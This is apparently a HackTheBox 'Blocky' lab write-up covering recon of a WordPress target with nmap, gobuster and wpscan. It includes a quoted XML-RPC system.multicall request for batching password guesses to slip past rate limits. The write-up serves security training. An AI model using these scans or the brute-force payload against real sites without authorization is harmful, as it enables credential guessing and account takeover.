# Recon
As usual we start with a port scan against the target:
```
sudo nmap -sCV -O -p- 10.10.10.37 -oN nmap.txt -T5 -Pn
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Blocky/assets/1.png">

We found a WordPress 4.8 service running on port 80, SSH on 22 and an outdated ProFTPd server on default port 21.

# Enumeration
The website does mention the development of a wiki and a plugin so we'll run gobuster in an attempt to find the locations.

```
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.37 
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Blocky/assets/2.png">

We do find the wiki and some other directories. We'll enumerate these in a moment.

As the site is running on WordPress we'll run ```wpscan``` on the target to find possible vulnerabilities. The results show that ```XML-RPC``` is enabled. This is actually an API that allows developers, who make 3rd party application and services, to interact with the WordPress site.

The API is accessible by sending POST requests to http://10.10.10.37/xmlrpc.php. I found a blog writing about abusing this to do bruteforce attacks: https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/

An example:
```
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 1560

<?xml version="1.0"?>
<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>

</data></array></value></param></params></methodCall>
```
The advantage is that we can send multiple usernames/passwords in just one POST request. This will help us to avoid any security control in place which could block too many requests.
Downside is that it's a lot of manual work or you'll need to write a script that generates the request. We'll not go down this path because if we do want to run a bruteforce on the WordPress login page there's nothing blocking our attempts in the first case.


